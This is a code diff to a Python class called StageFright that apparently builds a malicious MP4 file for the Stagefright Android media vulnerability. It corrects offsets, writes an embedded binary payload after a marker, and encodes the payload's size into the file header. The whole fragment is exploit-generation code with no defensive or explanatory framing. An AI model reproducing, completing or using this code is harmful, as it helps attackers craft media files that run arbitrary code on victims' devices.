@@ -71,7 +71,7 @@ class StageFright(object):
         }
 
         self.Footer_Magic = {
-            "offset": 30976,
+            "offset": 33008,
             "value": bytearray([0x00, 0x00, 0x01, 0xC5, 0x6D, 0x64, 0x69, 0x61, 0x00, 0x00, 0x00, 0x01, 0x74, 0x78, 0x33, 0x67,
                                                     0x00, 0x00, 0x00, 0x01, 0xFF, 0xFF, 0x80, 0x00])
         }
@@ -223,15 +223,25 @@ class StageFright(object):
         byteChoice = 0
         i = 0
         while i < size:
-            self.mp4_data[i + offset] = self.bin_data[byteChoice]
+            self.mp4_data[i + offset] = bytes[byteChoice]
             byteChoice += 1
             if byteChoice >= len(bytes):
                 byteChoice = 0
             i += spacing
         return
 
+    def to_bytes(self, n, length, endianess='big'):
+        h = '%x' % n
+        s = ('0' * (len(h) % 2) + h).zfill(length * 2).decode('hex')
+        return s if endianess == 'big' else s[::-1]
+
     def write_bin_size(self):
-        print (self.bin_data).to_bytes(4, byteorder='big')
+        bin_size = self.to_bytes(len(self.bin_data), 4, 'nope')
+        i = 0
+        while i < 4:
+            print "".join(bin_size[i].encode('hex'))
+            self.mp4_data[self.BinLead["offset"] + len(self.BinLead["bytes"]) - 3 - i] = bin_size[i]
+            i += 1
 
     def convert(self):
         if len(self.bin_data) > 29832:
@@ -257,6 +267,6 @@ class StageFright(object):
                 print "The system version is not supported! Exiting..."
             self.fill_bytes(self.Footer_Fill["value"], self.Footer_Fill["offset"], self.Footer_Fill["length"], self.Footer_Fill["spacing"])
             self.write_bytes(self.Footer_Magic["value"], self.Footer_Magic["offset"])
-            self.write_bytes(self.BinLead["bytes"], self.BinLead["offset"])
+            self.write_bytes(self.bin_data, self.BinLead["offset"] + len(self.BinLead["bytes"]) - 2)
             self.write_bin_size()
             return self.mp4_data
